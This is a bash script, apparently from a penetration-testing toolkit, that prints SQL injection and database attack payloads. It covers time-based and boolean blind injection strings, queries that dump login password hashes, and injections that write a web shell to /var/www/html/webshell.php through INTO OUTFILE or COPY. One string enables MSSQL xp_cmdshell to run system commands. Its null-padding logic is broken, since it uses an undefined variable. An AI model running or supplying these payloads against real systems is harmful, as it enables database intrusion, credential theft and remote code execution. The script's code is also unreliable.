#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

get_mssql_commands() {
    echo 'MSSQL database commands'
    echo 'SELECT name FROM sys.databases;'
    echo 'Use [database]'
    echo "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
    echo 'Select top 3 * from msdb.dbo.sysusers;'
    echo 'SELECT name, password_hash FROM sys.sql_logins;'

}

get_mysql_commands() {
    echo 'MySQL database commands'
    echo 'SHOW DATABASES;'
    echo 'USE [database];'
    echo 'SHOW TABLES;'
    echo 'SELECT * FROM users LIMIT 3;'
    echo 'SELECT * FROM information_schema.columns;'

}

get_sqli_commands() {
    echo 'SQL Injection commands'
    echo "OR 1=1 in (Select $cmd) INTO OUTFILE "   
    echo "Union Select $cmd INTO OUTFILE "
}

get_blind_sqli_commands() {
    echo 'Blind SQL Injection Test Commands'
    echo ''
    echo '=== Time-based Blind SQLi ==='
    echo "' OR (SELECT SLEEP(5)) --"
    echo "' OR IF(1=1, SLEEP(5), 0) --"
    echo "'; WAITFOR DELAY '00:00:05' --"
    echo "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND SLEEP(5)) --"
    echo ''
    echo '=== Boolean-based Blind SQLi ==='
    echo "' AND 1=1 --"
    echo "' AND 1=2 --"
    echo "' AND (SELECT SUBSTRING(@@version,1,1))='5' --"
    echo "' AND (SELECT SUBSTRING(user(),1,1))='r' --"
    echo "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
    echo ''
    echo '=== Database Detection ==='
    echo "' AND @@version LIKE '%MySQL%' --"
    echo "' AND @@version LIKE '%Microsoft%' --"
    echo "' AND (SELECT sqlite_version()) --"
    echo ''
    echo '=== Data Extraction (Character by Character) ==='
    echo "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --"
    echo "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114 --"
    echo "' AND LENGTH((SELECT database()))=8 --"
    echo ''
    echo '=== MSSQL Specific ==='
    echo "' AND (SELECT SUBSTRING(@@version,1,1))='M' --"
    echo "'; IF(1=1) WAITFOR DELAY '00:00:05' --"
    echo ''
    echo '=== Oracle Specific ==='
    echo "' AND (SELECT banner FROM v\$version WHERE rownum=1) LIKE '%Oracle%' --"
    echo "' AND (SELECT COUNT(*) FROM user_tables)>0 --"
}

get_mysql_injection() {
    if [[ ! -z "$1" ]]; then
        cmd="$1"
    fi    
    if [[ -z "$cmd" ]]; then
        cmd="cmd"
    fi
    if [[ ! -z "$2" ]]; then
        outfile_location=$2
    fi
    if [[ -z "$outfile_location" ]]; then
        outfile_location="/var/www/html/webshell.php"
    fi
    if [[ ! -z "$3" ]]; then
        num_sql_back_null="$3"
    fi
    if [[ -z "$num_sql_back_null" ]]; then
        num_sql_back_null=4
    fi
    if [[ -z "$num_sql_front_null" ]]; then
        num_sql_front_null=0
    fi
    local back_null_values=""
    for ((i=1; i<=num_sql_null; i++)); do
        null_values+=", null"
    done
    if [[ ! -z "$union_select" ]] && [[ $union_select == true ]]; then
        echo  " UNION SELECT \"$cmd')\" $null_values INTO OUTFILE \"$outfile_location\""
    else
        echo  " OR 1=1 IN (Select '$cmd') INTO OUTFILE \"$outfile_location\""
    fi
}

get_postgresql_injection() {
    if [[ -z "$cmd" ]]; then
        cmd="cmd"
    fi
    if [[ -z "$outfile_location" ]]; then
        outfile_location="/var/www/html/webshell.php"
    fi
    echo " COPY (SELECT '$cmd') TO \"$outfile_location\""
}

get_mssql_injection() {
    echo "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXECUTE xp_cmdshell '$cmd' --//"
}